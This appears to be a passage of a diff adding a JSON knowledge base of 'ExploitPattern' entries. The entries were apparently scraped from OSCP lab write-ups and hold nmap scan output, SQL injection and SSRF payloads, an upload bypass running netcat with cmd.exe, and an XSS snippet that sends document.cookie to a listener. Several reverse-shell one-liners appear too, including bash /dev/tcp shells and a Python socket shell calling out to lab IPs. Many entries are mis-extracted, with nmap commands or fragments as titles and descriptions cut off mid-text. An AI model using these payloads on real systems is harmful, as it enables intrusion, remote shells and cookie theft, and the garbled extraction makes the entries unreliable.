+      "/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-38",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sat Aug 28 10:24:04 2021 as: nmap -Pn -p- -sV -sC -T4 -oN sona.nmap 192.168.220.159",
+    "description": "Nmap scan report for 192.168.220.159 Not shown: 65533 filtered ports PORT     STATE  SERVICE VERSION 8081/tcp open   http    Jetty 9.4.18.v20190429 | http-robots.txt: 2 disallowed entries |_http-server-header: Nexus/3.21.1-01 (OSS) |_http-title: Nexus Repository Manager Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . We find the NEXUS BACKUP MANAGER service on port 23. ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Sona/Screenshot%202021-09-19%20133902.png)",
+    "techniques": [
+      "Nmap scan report for 192.168.220.159",
+      "Host is up (0.21s latency).",
+      "Not shown: 65533 filtered ports",
+      "PORT     STATE  SERVICE VERSION",
+      "23/tcp   closed telnet",
+      "8081/tcp open   http    Jetty 9.4.18.v20190429",
+      "| http-robots.txt: 2 disallowed entries",
+      "|_/repository/ /service/",
+      "|_http-server-header: Nexus/3.21.1-01 (OSS)",
+      "|_http-title: Nexus Repository Manager",
+      "Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .",
+      "POST /service/rest/beta/repositories/go/group HTTP/1.1",
+      "Content-Length: 4842",
+      "Host: 192.168.88.159:8081",
+      "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+      "Accept: */*",
+      "Accept-Language: en-US,en;q=0.5",
+      "Accept-Encoding: gzip, deflate",
+      "X-Nexus-UI: true",
+      "404: bash -i >& /dev/tcp/192.168.49.88/8081  0>&1"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-39",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.92 scan initiated Sun Mar  6 10:25:13 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.180.108/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.180.108/scans/xml/_full_tcp_nmap.xml 192.168.180.108",
+    "description": "![Splodge ](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Splodge/Splodge.png) Nmap scan report for 192.168.180.108 Host is up, received user-set (0.29s latency). Scanned at 2022-03-06 10:25:14 EST for 812s Not shown: 65530 filtered tcp ports (no-response) PORT     STATE SERVICE    REASON  VERSION 22/tcp   open  ssh        syn-ack OpenSSH 7.4 (protocol 2.0) |   2048 43:77:53:46:f8:78:c6:cb:c4:c6:b5:f2:61:2a:64:13 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPwvufh9SVq1esIL7otDp06DD4IT3lXLNsiufWRGWZwSq8BB+29e4wiJnBQfAiQFF/dNt5p27eJzYa+OYewPk7Zit35SAICkvHV3NA/zI4pax4JRd5AHM+zroHUcV6SqwX+rd531CPzaAb8Xaak//bMLeNKq2c1JZQeoaYmfbn+Td7ta84bxvT8espah5VcbAem7pave8aO9tPiUbwyv7XcuRQjvka6rpP5PEtsfjV9lZpUySf+aBqCo+pLsiSwKo5TvfZgPWKdy1t+22AxBN9RRdOjL+sUuebhpeFVIJvSd",
+    "techniques": [
+      "Nmap scan report for 192.168.180.108",
+      "Host is up, received user-set (0.29s latency).",
+      "Scanned at 2022-03-06 10:25:14 EST for 812s",
+      "Not shown: 65530 filtered tcp ports (no-response)",
+      "PORT     STATE SERVICE    REASON  VERSION",
+      "22/tcp   open  ssh        syn-ack OpenSSH 7.4 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   2048 43:77:53:46:f8:78:c6:cb:c4:c6:b5:f2:61:2a:64:13 (RSA)",
+      "|   256 a5:b4:45:1f:eb:10:ac:1d:fc:64:de:4b:87:ed:7d:ca (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLLwdPpjO1Ei905tBE6MjbWXmZ184WFpsIrIoICi912YeOtl1bIhE4MKxi9XmFXsiHUfzF+XGVju5DJn6PedwXc=",
+      "|   256 44:7c:68:45:db:3d:45:9b:ec:7c:0d:94:6b:9e:31:f5 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEu69xrp39qFb1fQ53wr0mHcTOIZlr2Lvez7PabGgwdS",
+      "80/tcp   open  http       syn-ack nginx 1.16.1",
+      "|_http-title: 403 Forbidden",
+      "| http-git:",
+      "|   192.168.180.108:80/.git/",
+      "|     Git repository found!",
+      "|     .git/config matched patterns 'user'",
+      "|     .gitignore matched patterns 'bug' 'key'",
+      "|     Repository description: Unnamed repository; edit this file 'description' to name the..."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-40",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sun Feb  6 05:41:33 2022 as: nmap -vv --reason -Pn -T4 -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/AutoRecon/results/192.168.117.148/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/AutoRecon/results/192.168.117.148/scans/xml/_full_tcp_nmap.xml 192.168.117.148",
+    "description": "Nmap scan report for 192.168.117.148 Host is up, received user-set (0.22s latency). Scanned at 2022-02-06 05:41:34 EST for 371s Not shown: 65523 filtered ports PORT      STATE  SERVICE     REASON         VERSION 20/tcp    closed ftp-data    reset ttl 63 21/tcp    open   ftp         syn-ack ttl 63 vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: PASV failed: 550 Permission denied. |      Connected to 192.168.49.117 |      No session bandwidth limit",
+    "techniques": [
+      "Nmap scan report for 192.168.117.148",
+      "Host is up, received user-set (0.22s latency).",
+      "Scanned at 2022-02-06 05:41:34 EST for 371s",
+      "Not shown: 65523 filtered ports",
+      "Reason: 65523 no-responses",
+      "PORT      STATE  SERVICE     REASON         VERSION",
+      "20/tcp    closed ftp-data    reset ttl 63",
+      "21/tcp    open   ftp         syn-ack ttl 63 vsftpd 2.0.8 or later",
+      "| ftp-anon: Anonymous FTP login allowed (FTP code 230)",
+      "|_Can't get directory listing: PASV failed: 550 Permission denied.",
+      "| ftp-syst:",
+      "|   STAT:",
+      "| FTP server status:",
+      "|      Connected to 192.168.49.117",
+      "|      Logged in as ftp",
+      "|      TYPE: ASCII",
+      "|      No session bandwidth limit",
+      "|      Session timeout in seconds is 300",
+      "|      Control connection is plain text",
+      "|      Data connections will be plain text"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-41",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.92 scan initiated Sun Feb 27 00:15:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/AutoRecon/results/192.168.128.88/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/AutoRecon/results/192.168.128.88/scans/xml/_full_tcp_nmap.xml 192.168.128.88",
+    "description": "Warning: 192.168.128.88 giving up on port because retransmission cap hit (6). Nmap scan report for 192.168.128.88 Host is up, received user-set (0.28s latency). Scanned at 2022-02-27 00:15:18 EST for 1752s Not shown: 65512 closed tcp ports (conn-refused) PORT      STATE    SERVICE        REASON      VERSION 22/tcp    open     ssh            syn-ack     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCm5CuyxbQ0hflsMDQe6CKt3H41UNbqR/7dqfRp2OkKxsOZ8sM0gHgGPU41j+b6ByHnkBSYi+NEIV+VXcnpGraaGhn/3mjF5uvgVdei5n2O9ZgX6Vuefk4o6Q3DL2DsEtOCaepPimfSX1TetQUjWc8f9ciax4Za5FdCjZL/L1eV211Aidf93iROG7y6GUzRyMGBGQTPUnZK39dTmJEpo+qprHmv2LCG84azdXwTGR1YilTVtrgnkMUyrq6gnuins4fxLkm5OwnznuL8nQgIWfH9I0YGuFkqf3pR1VHFe",
+    "techniques": [
+      "Warning: 192.168.128.88 giving up on port because retransmission cap hit (6).",
+      "Nmap scan report for 192.168.128.88",
+      "Host is up, received user-set (0.28s latency).",
+      "Scanned at 2022-02-27 00:15:18 EST for 1752s",
+      "Not shown: 65512 closed tcp ports (conn-refused)",
+      "PORT      STATE    SERVICE        REASON      VERSION",
+      "22/tcp    open     ssh            syn-ack     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   2048 9c:fe:0b:8b:8d:15:e7:72:7e:3c:23:e5:86:55:51:2d (RSA)",
+      "|   256 fe:eb:ef:5d:40:e7:06:67:9b:63:67:f8:d9:7e:d3:e2 (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOByIes6+atfEdAfAg4dy8LGa1TrPSa7sVSWSkEc5X+/932xaylSrtw/EvgKnGFW4zxSDNywRWtsJ6PN2iTRujQ=",
+      "|   256 35:83:68:2c:33:8b:b4:6c:24:21:20:0d:52:ed:cd:16 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILUvvXW/tfdzAPwVMpeX7n7D3ObXCvVg2fpFsKc3htfy",
+      "80/tcp    open     http           syn-ack     Apache httpd 2.4.38 ((Debian))",
+      "|_http-server-header: Apache/2.4.38 (Debian)",
+      "| http-methods:",
+      "|_  Supported Methods: GET HEAD POST OPTIONS",
+      "|_http-title: Did not follow redirect to http://sunset-midnight/",
+      "| http-robots.txt: 1 disallowed entry",
+      "|_/wp-admin/"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-42",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Sun Nov 14 05:24:04 2021 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/OffSecPG/Surf/AutoRecon/results/192.168.73.171/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/OffSecPG/Surf/AutoRecon/results/192.168.73.171/scans/xml/_full_tcp_nmap.xml 192.168.73.171",
+    "description": "Increasing send delay for 192.168.73.171 from 0 to 5 due to 11 out of 11 dropped probes since last increase. Increasing send delay for 192.168.73.171 from 5 to 10 due to 11 out of 22 dropped probes since last increase. Warning: 192.168.73.171 giving up on port because retransmission cap hit (6). Nmap scan report for 192.168.73.171 Host is up, received user-set (0.21s latency). Scanned at 2021-11-14 05:24:05 EST for 1150s PORT      STATE    SERVICE REASON         VERSION 22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+    "techniques": [
+      "Increasing send delay for 192.168.73.171 from 0 to 5 due to 11 out of 11 dropped probes since last increase.",
+      "Increasing send delay for 192.168.73.171 from 5 to 10 due to 11 out of 22 dropped probes since last increase.",
+      "Warning: 192.168.73.171 giving up on port because retransmission cap hit (6).",
+      "Nmap scan report for 192.168.73.171",
+      "Host is up, received user-set (0.21s latency).",
+      "Scanned at 2021-11-14 05:24:05 EST for 1150s",
+      "Not shown: 65529 closed ports",
+      "Reason: 65529 resets",
+      "PORT      STATE    SERVICE REASON         VERSION",
+      "22/tcp    open     ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)",
+      "|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)",
+      "| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=",
+      "|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)",
+      "|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+",
+      "80/tcp    open     http    syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))",
+      "|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA",
+      "| http-methods:",
+      "|_  Supported Methods: OPTIONS HEAD GET POST"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-43",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "UT99",
+    "description": "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/UT99/walkthrough.png)",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-44",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Fri Jul  2 09:04:26 2021 as: nmap -Pn -p- -sC -sV -T4 -oN Walla.nmap 192.168.229.97",
+    "description": "Nmap scan report for 192.168.229.97 PORT      STATE SERVICE    VERSION 22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) |   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA) |   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA) |_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519) 23/tcp    open  telnet     Linux telnetd 25/tcp    open  smtp       Postfix smtpd |_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,",
+    "techniques": [
+      "Nmap scan report for 192.168.229.97",
+      "Host is up (0.21s latency).",
+      "Not shown: 65528 closed ports",
+      "PORT      STATE SERVICE    VERSION",
+      "22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)",
+      "|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)",
+      "|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)",
+      "23/tcp    open  telnet     Linux telnetd",
+      "25/tcp    open  smtp       Postfix smtpd",
+      "|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,",
+      "| ssl-cert: Subject: commonName=walla",
+      "| Subject Alternative Name: DNS:walla",
+      "| Not valid before: 2020-09-17T18:26:36",
+      "|_Not valid after:  2030-09-15T18:26:36",
+      "|_ssl-date: TLS randomness does not represent time",
+      "53/tcp    open  tcpwrapped",
+      "422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)",
+      "8091/tcp  open  http       lighttpd 1.4.53"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-45",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "WebCal",
+    "description": "nmap -Pn -p- -sC -sV 192.168.191.37 -T4 -oN WebCal.nmap ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/WebCal/WebCal%202021-06-24%20213757.png) ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/WebCal/WebCal%202021-06-24%20233404.png) Try to find exploits in the HTTP service first. ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/WebCal/WebCal%202021-06-25%20010855.png)",
+    "techniques": [
+      "nmap -Pn -p- -sC -sV 192.168.191.37 -T4 -oN WebCal.nmap",
+      "ftp -p 192.168.191.37 21",
+      "feroxbuster -u http://192.168.191.37 -w /usr/share/wordlists/directory-list-2.3-medium.txt",
+      "smtp-user-enum -M RCPT -U /usr/share/wordlists/names.txt -t 192.168.191.37 -m 10 -f user@example.com",
+      "http:///webcalendar/docs/WebCalendar-SysAdmin.html",
+      "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.191\",21));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-46",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Wheels",
+    "description": "$ sudo nmap --min-rate 1000 -p- -Pn 192.168.123.202 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-01 11:24 CST Warning: 192.168.123.202 giving up on port because retransmission cap hit (10). Nmap scan report for 192.168.123.202 Not shown: 65367 closed tcp ports (reset), 166 filtered tcp ports (no-response) We found three special pages after web directory scanning. feroxbuster -u http://192.168.123.202/ -t 40 -w /usr/share/wordlists/dirb/common.txt -d 2 -k -x php,txt,html ![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Wheels/Wheels_20230131_234350_001.png)",
+    "techniques": [
+      "We found three special pages after web directory scanning.",
+      "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Wheels/Wheels_20230131_234350_001.png)",
+      "I try to use username `admin` for the SQL injection login test, but it doesn't work.",
+      "Next we register an account with username `admin` and then log in to the website.",
+      "Switching to the employee portal page and it shows `Access Denied`. So it is not a valid account.",
+      "After trying other testing methods (e.g., subdomain, cookie...), I find an e-mail address at bottom of the index page.",
+      "Using the e-mail to register an account with username tester and suddenly found that we can access the portal page.",
+      "When we do a search, the web page shows the user names and we notice that the parameters in the URL bar have changed.",
+      "The web page shows an `XML` error message when trying to change the parameter value.",
+      "After a while of searching, I find that we can use XML injection attacks. You can find many test methods on the [hacktrick](https://book.hacktricks.xyz/pentesting-web/xpath-injection) website.",
+      "I use string extraction to test, using two strings `') or 1=1 or ('` and `')] | //password%00` to find username and passowrd.",
+      "Login successfully via SSH using the first account and password combination.",
+      "Runnig linpeas to find an unknown SGID binary `/opt/get-list`.",
+      "Runnig get-list binary and it will prompt the usernames according to the selection.",
+      "I using `xxd` command to dump the binary information. Based on the analysis `(/bin/cat /root/details/%s)` we use the following inputs to obtain information.",
+      "Recovering root password."
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-47",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "Nmap 7.91 scan initiated Fri Jan 28 08:27:29 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /home/kali/Documents/ZenPhoto/AutoRecon/results/192.168.247.41/scans/_full_tcp_nmap.txt -oX /home/kali/Documents/ZenPhoto/AutoRecon/results/192.168.247.41/scans/xml/_full_tcp_nmap.xml 192.168.247.41",
+    "description": "Warning: 192.168.247.41 giving up on port because retransmission cap hit (6). Nmap scan report for 192.168.247.41 Host is up, received user-set (0.28s latency). Scanned at 2022-01-28 08:27:30 EST for 2034s PORT      STATE    SERVICE REASON      VERSION 22/tcp    open     ssh     syn-ack     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0) |   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAIM3Qmxj/JapoH/Vg/pl8IAj0PTqw5Fj5rnhI+9Q0XT5tej5pHpUZoWTmbQKIwA7QBoTWtk4Hnonhkv5We43VXz0abBEvy3allgjf13cvxc96KX0bE7Bb8PhVCQJJBDTIz44koJhvFuSO/sauL9j+lzaUltVMR6/bZbigTINrV4nAAAAFQCvlVi2Us40FGWv8TILJYOR/LJvcwAAAIAHpp8VGuPUA5BowTa55myGr/lGs0xTFXbxFm0We4/D5v3L9kUVgv6MIVL4jweRmXFYvei7YZDGikoe6OjF9PFtSkKriEaGqav6hOER3tmtWChQfMlaNwiZfNJzKHBc4EqeCX4jpLLUxCZAEjwo",
+    "techniques": [
+      "Warning: 192.168.247.41 giving up on port because retransmission cap hit (6).",
+      "Nmap scan report for 192.168.247.41",
+      "Host is up, received user-set (0.28s latency).",
+      "Scanned at 2022-01-28 08:27:30 EST for 2034s",
+      "Not shown: 65526 closed ports",
+      "Reason: 65526 conn-refused",
+      "PORT      STATE    SERVICE REASON      VERSION",
+      "22/tcp    open     ssh     syn-ack     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)",
+      "| ssh-hostkey:",
+      "|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)",
+      "|   2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)",
+      "23/tcp    open     ipp     syn-ack     CUPS 1.4",
+      "| http-methods:",
+      "|   Supported Methods: GET HEAD OPTIONS POST PUT",
+      "|_  Potentially risky methods: PUT",
+      "|_http-server-header: CUPS/1.4",
+      "|_http-title: 403 Forbidden",
+      "80/tcp    open     http    syn-ack     Apache httpd 2.2.14 ((Ubuntu))",
+      "|_  Supported Methods: GET HEAD POST OPTIONS",
+      "|_http-server-header: Apache/2.2.14 (Ubuntu)"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-48",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "RPC",
+    "description": "sudo nmap -p 5353 --script=rpcinfo  -sU",
+    "techniques": [
+      "nmap -p 5353 --script=rpcinfo",
+      "sudo nmap -p 5353 --script=rpcinfo  -sU",
+      "sudo nmap -Pn -sUC -p5353",
+      "rpcinfo -p"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "recon-49",
+    "type": "ExploitPattern",
+    "category": "RECON",
+    "title": "Recon",
+    "description": "[SHODAN](https://www.shodan.io/) [CloudRecon](https://github.com/g0ldencybersec/cloudrecon) [Cloud Services IP Ranges](https://github.com/lord-alfred/ipranges) subfinder -silent -d  | dnsx -silent",
+    "techniques": [
+      "subfinder -silent -d  | dnsx -silent",
+      "amass enum -d"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "recon"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-51",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "For example, assuming that only one column is searched",
+    "description": "- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/ - https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet - https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e - https://notchxor.github.io/oscp-notes/2-web/sqli/ - https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/ - https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
+    "techniques": [
+      "https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/",
+      "https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet",
+      "https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e",
+      "https://notchxor.github.io/oscp-notes/2-web/sqli/",
+      "https://www.asciitable.com/",
+      "https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/",
+      "https://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html",
+      "https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection",
+      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
+      "https://infosecwriteups.com/exploiting-error-based-sql-injections-bypassing-restrictions-ed099623cd94",
+      "https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/",
+      "' HAVING 1=1 --",
+      "' GROUP BY table.column1 HAVING 1=1 --",
+      "' GROUP BY table.column1, column2 HAVING 1=1 --",
+      "' GROUP BY table.column1, column2, column3(n) HAVING 1=1 -- and so on",
+      "-- e.g. guess username (ASCII)",
+      "'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --",
+      "'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on",
+      "-- e.g. confirm that the username is correct",
+      "'; IF (substring((select TOP 1 username from users), 1, 5) = 'admin') WAITFOR DELAY '00:00:05'--"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "ssrf-52",
+    "type": "ExploitPattern",
+    "category": "SSRF",
+    "title": "SSRF",
+    "description": "[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md) You can use [nip.io](https://nip.io/) or similar services.",
+    "techniques": [
+      "magic.127.0.0.1.nip.io",
+      "magic-127-0-0-1.nip.io",
+      "magic-7f000001.nip.io"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "ssrf"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-53",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "UDP",
+    "description": "sudo nmap -sU -T3 -Pn  --top-ports 200 sudo nmap -p69 --script=tftp-enum.nse  -sU",
+    "techniques": [],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "upload-54",
+    "type": "ExploitPattern",
+    "category": "UPLOAD",
+    "title": "File Upload Bypass",
+    "description": "reference: https://soroush.secproject.com/blog/tag/unrestricted-file-upload/#section2 :/nc.exe\"\" C:\\\\Windows\\\\Temp\\\\nc.exe\",1,true 'objshell.run \"cmd.exe /c C:\\\\Windows\\\\Temp\\\\nc.exe -e cmd.exe  \",1,true ' check if code executed successfully",
+    "techniques": [
+      ":/nc.exe\"\" C:\\\\Windows\\\\Temp\\\\nc.exe\",1,true",
+      "' reverse shell",
+      "'objshell.run \"cmd.exe /c C:\\\\Windows\\\\Temp\\\\nc.exe -e cmd.exe  \",1,true",
+      "' check if code executed successfully",
+      "Response.write(\"test\")"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "upload"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-59",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "sudo php -S 0.0.0.0:80",
+    "description": "https://portswigger.net/web-security/cross-site-scripting https://www.youtube.com/watch?v=KHwVjzWei1c https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss https://github.com/terjanq/Tiny-XSS-Payloads https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss // sudo python3 -m http.server 80 // enter a workable payload into the vulnerability input field var oReq = new XMLHttpRequest(); oReq.open('GET', 'http:///?output='+document.cookie, true);",
+    "techniques": [
+      "Session Hijacking",
+      "testing payload",
+      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss",
+      "hijacking.js",
+      "using cookie to access (e.g., Firefox DevTools)",
+      "![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Pic/XSS/XSS_Login.png)",
+      "Phishing"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-60",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "bash",
+    "description": "/bin/bash -l > /dev/tcp/192.168.49.202/18000 0&1 /usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'",
+    "techniques": [
+      "/bin/bash -l > /dev/tcp/192.168.49.202/18000 0&1",
+      "/usr/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/9999 0>&1'"
+    ],
+    "indicators": [],
+    "tags": [
+      "web",
+      "general"
+    ],
+    "confidence": 0.5
+  },
+  {
+    "id": "general-61",
+    "type": "ExploitPattern",
+    "category": "GENERAL",
+    "title": "find / -group wireshark 2>/dev/null",
